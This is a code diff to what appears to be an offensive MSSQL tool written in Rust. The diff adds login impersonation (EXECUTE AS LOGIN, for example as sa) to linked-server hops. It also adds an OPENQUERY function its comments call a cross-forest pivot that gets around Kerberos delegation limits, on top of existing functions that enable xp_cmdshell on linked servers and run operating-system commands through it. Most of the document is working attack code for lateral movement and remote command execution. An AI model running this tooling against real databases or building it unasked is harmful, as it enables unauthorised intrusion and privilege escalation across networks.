@@ -98,15 +98,32 @@ pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
     mssql_query(mssql_from_args(args)?, "EXEC sp_linkedservers;").await
 }
 
+/// Wrap `inner_query` in a source-side `EXECUTE AS LOGIN` if requested.
+///
+/// Cross-forest linked-server hops fail when the connecting principal can't
+/// double-hop (Kerberos delegation/SID filtering). Two source-side workarounds:
+/// - `EXECUTE AS LOGIN = 'sa'; <hop>` — runs the hop under sa's mapped login
+///   (requires SeImpersonatePrivilege or IMPERSONATE on the target login)
+/// - `SELECT * FROM OPENQUERY(...)` — uses the linked-server's configured
+///   `sp_addlinkedsrvlogin` mapping (separate path: see `mssql_openquery`)
+fn wrap_execute_as(inner_query: &str, impersonate_user: Option<&str>) -> String {
+    match impersonate_user {
+        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {inner_query}"),
+        None => inner_query.to_string(),
+    }
+}
+
 /// Execute a query on a linked MSSQL server.
 ///
 /// Required args: `target`, `username`, `linked_server`, `query`
-/// Optional args: `password`, `domain`, `windows_auth`
+/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
 pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
     let linked_server = required_str(args, "linked_server")?;
     let query = required_str(args, "query")?;
+    let impersonate_user = optional_str(args, "impersonate_user");
 
-    let full_query = format!("EXEC ('{query}') AT [{linked_server}];");
+    let hop = format!("EXEC ('{query}') AT [{linked_server}];");
+    let full_query = wrap_execute_as(&hop, impersonate_user);
 
     mssql_query(mssql_from_args(args)?, &full_query).await
 }
@@ -114,14 +131,16 @@ pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
 /// Enable xp_cmdshell on a linked MSSQL server.
 ///
 /// Required args: `target`, `username`, `linked_server`
-/// Optional args: `password`, `domain`, `windows_auth`
+/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
 pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> {
     let linked_server = required_str(args, "linked_server")?;
+    let impersonate_user = optional_str(args, "impersonate_user");
 
-    let full_query = format!(
+    let hop = format!(
         "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
          EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
     );
+    let full_query = wrap_execute_as(&hop, impersonate_user);
 
     mssql_query(mssql_from_args(args)?, &full_query).await
 }
@@ -129,12 +148,35 @@ pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> 
 /// Execute a command via xp_cmdshell on a linked MSSQL server.
 ///
 /// Required args: `target`, `username`, `linked_server`, `command`
-/// Optional args: `password`, `domain`, `windows_auth`
+/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
 pub async fn mssql_linked_xpcmdshell(args: &Value) -> Result<ToolOutput> {
     let linked_server = required_str(args, "linked_server")?;
     let command = required_str(args, "command")?;
+    let impersonate_user = optional_str(args, "impersonate_user");
 
-    let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
+    let hop = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");
+    let full_query = wrap_execute_as(&hop, impersonate_user);
+
+    mssql_query(mssql_from_args(args)?, &full_query).await
+}
+
+/// Query a linked MSSQL server via OPENQUERY using the linked server's
+/// configured remote login (sp_addlinkedsrvlogin) — bypasses Kerberos
+/// double-hop. This is the cross-forest pivot path when the connecting
+/// principal cannot delegate but the linked server has an explicit login
+/// mapping (e.g. `RPC OUT = ON` plus a stored credential).
+///
+/// Required args: `target`, `username`, `linked_server`, `query`
+/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
+pub async fn mssql_openquery(args: &Value) -> Result<ToolOutput> {
+    let linked_server = required_str(args, "linked_server")?;
+    let query = required_str(args, "query")?;
+    let impersonate_user = optional_str(args, "impersonate_user");
+
+    // OPENQUERY's inner string uses single quotes; double any embedded ones.
+    let escaped = query.replace('\'', "''");
+    let openq = format!("SELECT * FROM OPENQUERY([{linked_server}], '{escaped}');");
+    let full_query = wrap_execute_as(&openq, impersonate_user);
 
     mssql_query(mssql_from_args(args)?, &full_query).await
 }
